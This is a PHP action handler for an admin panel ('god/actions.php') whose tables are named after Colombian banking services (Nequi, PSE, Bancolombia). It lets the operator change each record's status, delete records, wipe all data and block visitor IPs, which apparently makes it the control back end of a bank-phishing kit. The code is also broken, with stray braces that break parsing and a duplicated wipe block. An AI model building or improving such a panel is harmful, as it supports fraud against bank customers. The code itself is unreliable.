<?php
// god/actions.php
session_start();
require_once __DIR__ . '/auth.php'; // Protege este archivo
require_once __DIR__ . '/../config/db.php';

// Validar parámetros
file_put_contents('debug_actions.txt', date('Y-m-d H:i:s') . " - Request: " . print_r($_GET, true) . "\n", FILE_APPEND);

if (isset($_GET['action']) || (isset($_GET['id'], $_GET['table'], $_GET['estado']))) {
    // IP Logic
    if (isset($_GET['action'])) {
        if ($_GET['action'] === 'block_ip' && isset($_GET['ip'])) {
            $stmt = $conn->prepare("INSERT IGNORE INTO blocked_ips (ip) VALUES (:ip)");
            $stmt->execute(['ip' => $_GET['ip']]);
            echo json_encode(['status' => 'success']);
            exit;
        }
        if ($_GET['action'] === 'unblock_ip' && isset($_GET['ip'])) {
            $stmt = $conn->prepare("DELETE FROM blocked_ips WHERE ip = :ip");
            $stmt->execute(['ip' => $_GET['ip']]);
            echo json_encode(['status' => 'success']);
            exit;
        }
            exit;
        }
    }

    // Acción Eliminar TODO (Nuke)
    if (isset($_GET['action']) && $_GET['action'] === 'delete_all') {
        try {
            // Delete all from allowed tables
            foreach (['pse', 'nequi'] as $t) {
                // TRUNCATE is faster and resets IDs
                $conn->exec("TRUNCATE TABLE $t");
            }
            // Also clear uploads maybe? User said "eliminar todos los datos"
            // Let's safe-keep uploads for now unless requested, but clearing DB is key.
            echo json_encode(['status' => 'success', 'message' => 'Panel limpiado correctamente']);
            exit();
        } catch (PDOException $e) {
            echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
            exit();
        }
    }

    $id = intval($_GET['id']);
    $table = $_GET['table'];
    $estado = intval($_GET['estado']);

    // Validar nombre de tabla para prevenir SQL Injection
    $allowed_tables = ['nequi', 'pse', 'bancolombia']; // Agrega más si existen
    if (!in_array($table, $allowed_tables)) {
        die("Tabla no permitida");
    }

    // Acción Eliminar
    if (isset($_GET['action']) && $_GET['action'] === 'delete') {
        try {
            $sql = "DELETE FROM $table WHERE id = :id";
            $stmt = $conn->prepare($sql);
            $stmt->execute(['id' => $id]);
            echo json_encode(['status' => 'success', 'message' => 'Eliminado correctamente']);
            exit();
        } catch (PDOException $e) {
            echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
            exit();
        }
    }

    // Acción Eliminar TODO (Nuke)
    if (isset($_GET['action']) && $_GET['action'] === 'delete_all') {
        try {
            // Delete all from allowed tables
            foreach (['pse', 'nequi'] as $t) {
                // TRUNCATE is faster and resets IDs
                $conn->exec("TRUNCATE TABLE $t");
            }
            // Also clear uploads maybe? User said "eliminar todos los datos"
            // Let's safe-keep uploads for now unless requested, but clearing DB is key.
            echo json_encode(['status' => 'success', 'message' => 'Panel limpiado correctamente']);
            exit();
        } catch (PDOException $e) {
            echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
            exit();
        }
    }

    // Actualizar estado
    try {
        $sql = "UPDATE $table SET estado = :estado WHERE id = :id";
        $stmt = $conn->prepare($sql);
        $stmt->execute(['estado' => $estado, 'id' => $id]);

        // Return JSON response for AJAX
        echo json_encode(['status' => 'success', 'message' => 'Estado actualizado']);
        exit();
    } catch (PDOException $e) {
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
        exit();
    }
} else {
    die("Faltan parámetros");
}
?>